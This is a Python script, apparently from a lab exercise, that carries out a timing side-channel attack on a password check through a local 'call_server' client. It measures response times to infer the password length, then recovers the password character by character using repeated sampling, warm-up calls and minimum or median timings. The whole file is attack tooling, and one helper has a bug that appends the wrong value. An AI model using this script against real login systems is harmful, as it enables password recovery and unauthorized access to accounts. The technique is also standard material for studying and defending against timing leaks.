from string import ascii_lowercase, digits
from client import call_server
from statistics import stdev ,mean , mode, median
from random import shuffle
import asyncio
from dataway import save_list_of_timings



def hoogste_uit_de_lijst(l=[]):
    if len(l)<1:
        return [0,0]
    next_result = hoogste_uit_de_lijst(l[1:])
    # print(next_result)
    if next_result[1] > l[0][1]:
        return next_result
    else:
        return l[0]
    
def komt_het_meest_voor(input=[]):
    return median(input)


def get_password_length(user='000000',samplesize=100, max_length=8,debug=False):
    if debug:
        return 7
    result_list= [ [] for _ in range(max_length) ]
    case_list=[]
    time_list=[]
    for length in range(1,max_length+1):
        for sample in range(1,samplesize+1):
            case_list+=[length]

    shuffle(case_list)
    result=call_server('000000', str('x'))
    for case in case_list:
        print(f"poging: {case}",end="\r")
        result,time=call_server(user, 't'*case)
        result_list[case-1]+=[float(time)]
    
    result=[[x,min(result_list[x])] for x in range(0, max_length)]
    print(f"\nHet resultaat si {hoogste_uit_de_lijst(result)}")
    return hoogste_uit_de_lijst(result)[0]+1





def get_password_length_second(user='000000',samplesize=100, max_length=8,debug=False):
    if debug:
        return 7
    high_score=[]
    result_list=[]

    for w in range(0,5):
            
        result=call_server('000000', str(w))
    ##outwr loop = length
    for pwl in range(1,max_length):
        
        time_list=[]
        for sample in range(1, samplesize):
            result=call_server('000000', str('x'))
            print("Ronde: "+str(sample)+' voor lengte '+str(pwl)+'        ',end='\r')
            result,time=call_server(user, 't'*pwl)
            time_list+=[float(time)]
            
        result_list+=[[pwl,min(time_list)]]
        
    print(result_list)
    print(hoogste_uit_de_lijst(result_list))
    return hoogste_uit_de_lijst(result_list)[0]







def do_attack(index,sub_pass_list=[],user='000000',case_list=['a','b','c']):
    ##warm up
    for w in range(0,5):
        result=call_server('000000', str(w))
    result_lijst2=[]
    for case in case_list:
        sub_pass_list[index]=case
        print("".join(sub_pass_list),end="\r")
        result, time=call_server(user,"".join(sub_pass_list))
        result_lijst2 += [[case,float(time)]]
        # print(f"aanval met de tijd van {time} en resultaat {result[0:5]}met het wachtwoord {"".join(sub_pass_list)}",end="\r")
    
        
    
    return result_lijst2

def pivot(character,l=[]):
    result=[]
    for item in l:
        if item[0]==character:
            result+=[item[1]]
    return  result

def pivot_result_list(result_lijst=[], charlist=ascii_lowercase+digits):
    result=[]
    for character in charlist:
        result+= [[character,pivot(character=character,l=result_lijst)]]  
    return result

def clean_list(result_lijst=[]):
    result=[]
    for item in result_lijst:
        result+=[[item[0],min(item[1])]]
    return result

def clean_list_median(result_lijst=[]):
    result=[]
    for item in result_lijst:
        result+=[[item[0],median(item[1])]]
    return result

def get_high_char(l=[]):
    if len(l)<1:
        return ['0',0]
    result = get_high_char(l[1:])
    if l[0][1]> result[1]:
        return l[0]
    else:
        return result
    




def generate_password_case_list(samplesize=100,character='a',max_length=8,min_length=1):
    result= [character*x for x in range (min_length,max_length+1) for y in range(0,samplesize)]
    shuffle(result)
    return result



def most_frequent(List):
    return max(set(List), key=List.count)

def remove_char_from_list(char,l):
    result=[]
    for item in l:
        if item !=char:
            result+=[char]
    return result













